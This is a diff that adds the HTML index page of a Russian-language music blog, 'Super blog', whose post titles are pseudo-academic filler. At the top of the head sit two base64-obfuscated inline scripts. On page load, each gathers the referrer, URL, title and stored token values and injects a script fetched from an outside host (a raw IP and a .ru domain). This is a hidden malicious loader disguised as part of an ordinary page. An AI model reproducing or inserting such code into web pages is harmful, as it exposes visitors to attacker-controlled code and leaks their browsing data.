@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfd0ZjdlMxQ2N3c2JYazVGbSc7CiAgICBpZiAoIXdpbmRvdy5fd0ZjdlMxQ2N3c2JYazVGbSkgewogICAgICAgIHdpbmRvdy5fd0ZjdlMxQ2N3c2JYazVGbSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cDovLzkxLjIxMC4xNjYuMjEzL3RaZzJYOWQzJywKICAgICAgICAgICAgUF9QQVRIOiAnaHR0cDovLzkxLjIxMC4xNjYuMjEzL2Q4MTJiZGUvcG9zdGJhY2snLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfR0d3eHdSYm4zWjl5dmJ2biA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0dHd3h3UmJuM1o5eXZidm4gIT09ICd1bmRlZmluZWQnICYmIF9HR3d4d1JibjNaOXl2YnZuICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9yWmo3R3JtQ3A5ZzR2SGZ2ID0gSlNPTi5wYXJzZShfR0d3eHdSYm4zWjl5dmJ2bik7CiAgICAgICAgdmFyIF92RHJnVlBCWDVkQ2RXREh3ID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX3JaajdHcm1DcDlnNHZIZnYuY3JlYXRlZF9hdCArIHdpbmRvdy5fd0ZjdlMxQ2N3c2JYazVGbS50dGwgPCBfdkRyZ1ZQQlg1ZENkV0RIdykgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX3lkdzhyV3dMNTJQWFQ2eUwgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfNHliMVZRUThEUmdHU0ZCdCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF9Oc2JWdG5MMXZQYzhoS2ZLID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF9Oc2JWdG5MMXZQYzhoS2ZLICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF9Oc2JWdG5MMXZQYzhoS2ZLICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX3dGY3ZTMUNjd3NiWGs1Rm0uUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX3lkdzhyV3dMNTJQWFQ2eUwgIT09ICd1bmRlZmluZWQnICYmIF95ZHc4cld3TDUyUFhUNnlMICYmIHdpbmRvdy5fd0ZjdlMxQ2N3c2JYazVGbS51bmlxdWUpIHsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF95ZHc4cld3TDUyUFhUNnlMKTsKICAgIH0KICAgIGlmICh0eXBlb2YgXzR5YjFWUVE4RFJnR1NGQnQgIT09ICd1bmRlZmluZWQnICYmIF80eWIxVlFROERSZ0dTRkJ0ICYmIHdpbmRvdy5fd0ZjdlMxQ2N3c2JYazVGbS51bmlxdWUpIHsKICAgICAgICBfTnNiVnRuTDF2UGM4aEtmSyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoXzR5YjFWUVE4RFJnR1NGQnQpOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX3dGY3ZTMUNjd3NiWGs1Rm0uUl9QQVRIICsgX05zYlZ0bkwxdlBjOGhLZks7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfWGczVnY4TWR5UVBWTFBjcCc7CiAgICBpZiAoIXdpbmRvdy5fWGczVnY4TWR5UVBWTFBjcCkgewogICAgICAgIHdpbmRvdy5fWGczVnY4TWR5UVBWTFBjcCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly91cm90cmluaHVpLnJ1LzFKM1pQajJDJywKICAgICAgICAgICAgUF9QQVRIOiAnaHR0cHM6Ly91cm90cmluaHVpLnJ1L2Q4MTJiZGUvcG9zdGJhY2snLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfSFhERERQWVdQZkRaOXJxUSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX0hYREREUFlXUGZEWjlycVEgIT09ICd1bmRlZmluZWQnICYmIF9IWERERFBZV1BmRFo5cnFRICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9nUEpwa3RueVY4OTJqcFdZID0gSlNPTi5wYXJzZShfSFhERERQWVdQZkRaOXJxUSk7CiAgICAgICAgdmFyIF9QcE5UQjk0M1hEZFBuV2RNID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX2dQSnBrdG55Vjg5MmpwV1kuY3JlYXRlZF9hdCArIHdpbmRvdy5fWGczVnY4TWR5UVBWTFBjcC50dGwgPCBfUHBOVEI5NDNYRGRQbldkTSkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX1o3bXNHeFo5d3BERmNzdDIgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfdndDR01WczlZcWRkcVZ3aCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF83TGJDbWJWUGhZNnhZam50ID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF83TGJDbWJWUGhZNnhZam50ICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF83TGJDbWJWUGhZNnhZam50ICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX1hnM1Z2OE1keVFQVkxQY3AuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX1o3bXNHeFo5d3BERmNzdDIgIT09ICd1bmRlZmluZWQnICYmIF9aN21zR3haOXdwREZjc3QyICYmIHdpbmRvdy5fWGczVnY4TWR5UVBWTFBjcC51bmlxdWUpIHsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9aN21zR3haOXdwREZjc3QyKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX3Z3Q0dNVnM5WXFkZHFWd2ggIT09ICd1bmRlZmluZWQnICYmIF92d0NHTVZzOVlxZGRxVndoICYmIHdpbmRvdy5fWGczVnY4TWR5UVBWTFBjcC51bmlxdWUpIHsKICAgICAgICBfN0xiQ21iVlBoWTZ4WWpudCArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3Z3Q0dNVnM5WXFkZHFWd2gpOwogICAgfQogICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAnYXBwbGljYXRpb24vamF2YXNjcmlwdCc7CiAgICAgICAgYS5zcmMgPSB3aW5kb3cuX1hnM1Z2OE1keVFQVkxQY3AuUl9QQVRIICsgXzdMYkNtYlZQaFk2eFlqbnQ7CiAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgIHMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoYSwgcykKICAgIH0pKCk7CiAgICA="></script>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+
+    <!-- Title -->
+    <title>Super blog</title>
+
+    <!-- Favicon -->
+    <link rel="icon" href="img/core-img/favicon.ico">
+
+    <!-- Core Stylesheet -->
+    <link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+    <!-- ##### Header Area Start ##### -->
+    <header class="header-area">
+
+        <!-- Top Header Area -->
+        <div class="top-header-area">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+                        <div class="top-header-content d-flex align-items-center justify-content-between">
+                            <!-- Breaking News Area -->
+                            <div class="top-breaking-news-area">
+                                <div id="breakingNewsTicker" class="ticker">
+                                    <ul>
+                                        <li><a href="#">Музыка лучше всех!</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+
+                            <!-- Social Info Area-->
+                            <div class="top-social-info-area">
+                                <a href="#"><i class="fa fa-google-plus" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-pinterest" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
+                                <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Navbar Area -->
+        <div class="viral-news-main-menu" id="stickyMenu">
+            <div class="classy-nav-container breakpoint-off">
+                <div class="container">
+                    <!-- Menu -->
+                    <nav class="classy-navbar justify-content-between" id="viralnewsNav">
+
+                        <!-- Logo -->
+                        <a class="nav-brand" href="index.html">Super blog</a>
+
+                        <!-- Navbar Toggler -->
+                        <div class="classy-navbar-toggler">
+                            <span class="navbarToggler"><span></span><span></span><span></span></span>
+                        </div>
+
+                        <!-- Menu -->
+                        <div class="classy-menu">
+
+                            <!-- close btn -->
+                            <div class="classycloseIcon">
+                                <div class="cross-wrap"><span class="top"></span><span class="bottom"></span></div>
+                            </div>
+
+                            <!-- Nav Start -->
+                            <div class="classynav">
+                                <ul>
+                                    <li class="active"><a href="index.html">Главная</a></li>
+                                    <li><a href="index.html">Статьи</a>
+                                        <ul class="dropdown">
+                                            
+                                            <li><a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html">Тема: «Почем...</a></li>
+                                            
+
+                                            <li><a href="c611efab8d61472f581ee849314480b4.html">Тема: «Конст...</a></li>
+                                            
+
+                                            <li><a href="nFYPEIEDy5vH.html">Тема: «Почем...</a></li>
+                                            
+
+                                            <li><a href="c775e16e363feed36f862028fb83f520.html">Тема: «Зерка...</a></li>
+                                            
+
+                                            <li><a href="bxdB8hQ9ZJHF2fKGBjwq6a0tLL.html">Тема: «Хрома...</a></li>
+                                            
+
+                                            <li><a href="tQIK8PDzeo9DSrHp0wD9FnKUhlE.html">Тема: «Почем...</a></li>
+                                            
+
+                                        </ul>
+                                    </li>
+                                    <li><a href="contact.html">Контакты</a></li>
+                                </ul>
+
+                                <!-- Search Button -->
+                                <div class="search-btn">
+                                    <i id="searchbtn" class="fa fa-search" aria-hidden="true"></i>
+                                </div>
+
+                                <!-- Search Form -->
+                                <div class="viral-search-form">
+                                    <form id="search" action="thanks.html" method="get">
+                                        <input type="text" name="search-terms" placeholder="">
+                                        <button type="submit"><i class="fa fa-search" aria-hidden="true"></i></button>
+                                    </form>
+                                </div>
+
+                            </div>
+                            <!-- Nav End -->
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- ##### Header Area End ##### -->
+
+    <!-- ##### Blog Post Area Start ##### -->
+    <div class="viral-story-blog-post section-padding-0-50">
+        <div class="container">
+            <div class="row">
+                <!-- Blog Posts Area -->
+                <div class="col-12 col-lg-8">
+                    <div class="row">
+                        
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html"><img src="./img/1000477-music-nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html" class="post-title">
+                                        <h6>Тема: «Почему многопланово асинхронное ритмическое поле?»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="c611efab8d61472f581ee849314480b4.html"><img src="./img/0054148_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="c611efab8d61472f581ee849314480b4.html" class="post-title">
+                                        <h6>Тема: «Конструктивный динамический эллипсис: методология и особенности»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="nFYPEIEDy5vH.html"><img src="./img/0054188_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="nFYPEIEDy5vH.html" class="post-title">
+                                        <h6>Тема: «Почему фактурна алеаторика?»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="c775e16e363feed36f862028fb83f520.html"><img src="./img/1000650-music-nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="c775e16e363feed36f862028fb83f520.html" class="post-title">
+                                        <h6>Тема: «Зеркальный кризис жанра: методология и особенности»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="bxdB8hQ9ZJHF2fKGBjwq6a0tLL.html"><img src="./img/0054093_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="bxdB8hQ9ZJHF2fKGBjwq6a0tLL.html" class="post-title">
+                                        <h6>Тема: «Хроматический полиряд: методология и особенности»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- Single Blog Post -->
+                        <div class="col-12 col-lg-6">
+                            <div class="single-blog-post style-3">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="tQIK8PDzeo9DSrHp0wD9FnKUhlE.html"><img src="./img/1000611-music-nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="tQIK8PDzeo9DSrHp0wD9FnKUhlE.html" class="post-title">
+                                        <h6>Тема: «Почему фактурна протяженность?»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                        <p class="post-date">26.06.2020</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                    </div>
+                </div>
+
+                <!-- Sidebar Area -->
+                <div class="col-12 col-lg-4">
+                    <div class="sidebar-area">
+
+                        <!-- Newsletter Widget -->
+                        <div class="newsletter-widget mb-70">
+                            <h4>Рассылка</h4>
+                            <form action="thanks.html" method="post">
+                                <input type="text" name="text" placeholder="Имя">
+                                <input type="email" name="email" placeholder="email">
+                                <button type="submit" class="btn w-100">Подписаться</button>
+                            </form>
+                        </div>
+
+                        <!-- Trending Articles Widget -->
+                        <div class="treading-articles-widget mb-70">
+                            <h4>Недавние посты</h4>
+                            
+                            <!-- Single Trending Articles -->
+                            <div class="single-blog-post style-4">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html"><img src="./img/1000477-music-nevseoboi.com.ua.jpg" alt=""></a>
+                                    <span class="serial-number">0.</span>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html" class="post-title">
+                                        <h6>Тема: «Почему многопланово асинхронное ритмическое поле?»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+
+                            <!-- Single Trending Articles -->
+                            <div class="single-blog-post style-4">
+                                <!-- Post Thumb -->
+                                <div class="post-thumb">
+                                    <a href="c611efab8d61472f581ee849314480b4.html"><img src="./img/0054148_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                    <span class="serial-number">1.</span>
+                                </div>
+                                <!-- Post Data -->
+                                <div class="post-data">
+                                    <a href="c611efab8d61472f581ee849314480b4.html" class="post-title">
+                                        <h6>Тема: «Конструктивный динамический эллипсис: методология и особенности»</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-author"><a href="">Надежда</a></p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+
+
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- ##### Blog Post Area End ##### -->
+
+    <!-- ##### Footer Area Start ##### -->
+    <footer class="footer-area">
+
+        <!-- Main Footer Area -->
+        <div class="main-footer-area">
+            <div class="container">
+                <div class="row">
+
+                    <!-- Footer Widget Area -->
+                    <div class="col-12 col-md-6 col-lg-4">
+                        <div class="footer-widget-area">
+                            <!-- Footer Logo -->
+                            <div class="footer-logo">
+                                <a href="index.html">Super blog</a>
+                            </div>
+                            <!-- Footer Nav -->
+                            <div class="footer-nav">
+                                <ul>
+                                    <li><a href="index.html">Главная</a></li>
+                                    
+                                    <li><a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html">Тема: «Почем...</a></li>
+                                    
+
+                                    <li><a href="c611efab8d61472f581ee849314480b4.html">Тема: «Конст...</a></li>
+                                    
+
+                                    <li><a href="nFYPEIEDy5vH.html">Тема: «Почем...</a></li>
+                                    
+
+                                    <li><a href="c775e16e363feed36f862028fb83f520.html">Тема: «Зерка...</a></li>
+                                    
+
+                                    <li><a href="bxdB8hQ9ZJHF2fKGBjwq6a0tLL.html">Тема: «Хрома...</a></li>
+                                    
+
+                                    <li><a href="tQIK8PDzeo9DSrHp0wD9FnKUhlE.html">Тема: «Почем...</a></li>
+                                    
+
+                                    <li><a href="contact.html">Контакты</a></li>
+                                    <li><a href="terms.html">Условия и положения</a></li>
+                                    <li><a href="policy.html">Политика конфиденциальности</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-12 col-md-6 col-lg-4">
+                        <!-- Newsletter Widget -->
+                        <div class="newsletter-widget">
+                            <h4>Рассылка</h4>
+                            <form action="thanks.html" method="post">
+                                <input type="text" name="text" placeholder="Имя">
+                                <input type="email" name="email" placeholder="email">
+                                <button type="submit" class="btn w-100">Подписаться</button>
+                            </form>
+                        </div>
+                    </div>
+
+                    <!-- Footer Widget Area -->
+                    <div class="col-12 col-md-6 col-lg-4">
+                        <div class="footer-widget-area">
+                            <!-- Widget Title -->
+                            <h4 class="widget-title">Недавние посты</h4>
+
+                            
+                            <!-- Single Latest Post -->
+                            <div class="single-blog-post style-2 d-flex align-items-center">
+                                <div class="post-thumb">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html"><img src="./img/1000477-music-nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <div class="post-data">
+                                    <a href="CNCBxeHo7SMVWpMXUdh2D1mx1adnTk.html" class="post-title">
+                                        <h6>Тема: «Почему многопланово асинхронное ритмическое поле?».</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-date"><a href="">26.06.2020</a></p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+
+                            <!-- Single Latest Post -->
+                            <div class="single-blog-post style-2 d-flex align-items-center">
+                                <div class="post-thumb">
+                                    <a href="c611efab8d61472f581ee849314480b4.html"><img src="./img/0054148_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <div class="post-data">
+                                    <a href="c611efab8d61472f581ee849314480b4.html" class="post-title">
+                                        <h6>Тема: «Конструктивный динамический эллипсис: методология и особенности».</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-date"><a href="">26.06.2020</a></p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+
+                            <!-- Single Latest Post -->
+                            <div class="single-blog-post style-2 d-flex align-items-center">
+                                <div class="post-thumb">
+                                    <a href="nFYPEIEDy5vH.html"><img src="./img/0054188_www.nevseoboi.com.ua.jpg" alt=""></a>
+                                </div>
+                                <div class="post-data">
+                                    <a href="nFYPEIEDy5vH.html" class="post-title">
+                                        <h6>Тема: «Почему фактурна алеаторика?».</h6>
+                                    </a>
+                                    <div class="post-meta">
+                                        <p class="post-date"><a href="">26.06.2020</a></p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bottom Footer Area -->
+        <div class="bottom-footer-area">
+            <div class="container h-100">
+                <div class="row h-100 align-items-center">
+                    <div class="col-12">
+
+                        <p>
+Copyright &copy;<script>document.write(new Date().getFullYear());</script> All rights reserved
+                        </p>
+                        <p>
+                            <a 
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- ##### Footer Area Start ##### -->
+
+    <!-- ##### All Javascript Files ##### -->
+    <!-- jQuery-2.2.4 js -->
+    <script src="js/jquery/jquery-2.2.4.min.js"></script>
+    <!-- Popper js -->
+    <script src="js/bootstrap/popper.min.js"></script>
+    <!-- Bootstrap js -->
+    <script src="js/bootstrap/bootstrap.min.js"></script>
+    <!-- All Plugins js -->
+    <script src="js/plugins/plugins.js"></script>
+    <!-- Active js -->
+    <script src="js/active.js"></script>
+    <div class='cookie-banner'>
+        <p>
+            Сайт использует файлы cookie. Они позволяют узнавать вас и получать информацию о вашем пользовательском опыте.Продолжая просмотр сайта, я соглашаюсь с использованием файлов cookie владельцем сайта в соответствии с <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Политикой cookie</a>
+        </p>
+        <button class='close-cookie'>&times;</button>
+    </div>
+    <script>
+        window.onload = function() {
+            $('.close-cookie').click(function () {
+                $('.cookie-banner').fadeOut();
+            })
+        }
+    </script>
+    <script>
+        let elems = document.querySelectorAll('.server-name');
+        elems.forEach((elem) => {
+            elem.innerHTML = window.location.hostname
+        })
+    </script>
+</body>
+
+</html>
